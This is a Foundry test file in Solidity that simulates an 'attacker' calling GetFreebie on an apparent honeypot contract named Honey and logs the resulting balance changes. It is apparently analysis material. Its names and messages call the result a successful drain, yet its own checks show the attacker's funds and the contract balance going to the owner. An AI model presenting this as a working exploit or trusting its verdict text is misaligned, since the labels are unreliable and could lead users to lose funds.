// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xe4eabdca81e31d9acbc4af76b30f532b6ed7f3bf.sol";

contract HoneyTest is Test {
    Honey honey;
    address owner = address(0xABCD);
    address user = address(0x1);
    address attacker = address(0x2);
    // Explicitly store attack amount
    uint256 attackerSentAmount = 1.000000000000000001 ether;

    function setUp() public {
        vm.prank(owner);
        honey = new Honey();
    }

    function test_anyone_can_drain_contract() public {
        // Initial state setup
        vm.deal(address(honey), 3 ether);
        uint256 contractBalanceBefore = address(honey).balance;
        uint256 ownerBalanceBefore = owner.balance;
        uint256 attackerBalanceBefore = attacker.balance;

        console.log("--- BEFORE-Contract Drain ---");
        console.log("Contract balance:       %s", contractBalanceBefore);
        console.log("Attacker balance:       %s", attackerBalanceBefore);
        console.log("Owner balance:          %s", ownerBalanceBefore);

        // Provide attacker with required ETH
        vm.deal(attacker, attackerSentAmount);
        attackerBalanceBefore = attacker.balance;
        console.log("\nAttacker funded:       %s", attackerSentAmount);
        console.log("Attacker new balance:  %s", attackerBalanceBefore);

        console.log("\n--- Trigger Contract Drain ---");
        console.log("Attacker calls GetFreebie(%s)", attackerSentAmount);
        vm.prank(attacker);
        honey.GetFreebie{value: attackerSentAmount}();

        console.log("\n--- AFTER-Contract Drain ---");
        uint256 contractBalanceAfter = address(honey).balance;
        uint256 attackerBalanceAfter = attacker.balance;
        uint256 ownerBalanceAfter = owner.balance;

        console.log("Contract balance:       %s (Change: %s)", 
            contractBalanceAfter, contractBalanceBefore - contractBalanceAfter);
        console.log("Attacker balance:       %s (Change: %s)", 
            attackerBalanceAfter, attackerBalanceBefore - attackerBalanceAfter);
        console.log("Owner balance:          %s (Change: %s)", 
            ownerBalanceAfter, ownerBalanceAfter - ownerBalanceBefore);

        // Differential verification
        bool contractDrained = contractBalanceAfter == 0;
        bool fundsTransferred = ownerBalanceAfter == 
               ownerBalanceBefore + contractBalanceBefore + attackerSentAmount;
        bool fundsTaken = attackerBalanceAfter == 0;
        
        console.log("\n--- Vulnerability Verification ---");
        console.log("Contract fully drained: %s", contractDrained ? "YES" : "NO");
        console.log("Funds transferred:       %s", fundsTransferred ? "YES" : "NO");
        console.log("Attacker funds spent:   %s\n", fundsTaken ? "YES" : "NO");

        // Final conditional verdict
        if(contractDrained && fundsTransferred && fundsTaken) {
            console.log("Vulnerability Exists: Attacker successfully drained contract balance");
        } else {
            console.log("Vulnerability not Exist: Critical conditions not met for drain attack");
        }
    }
}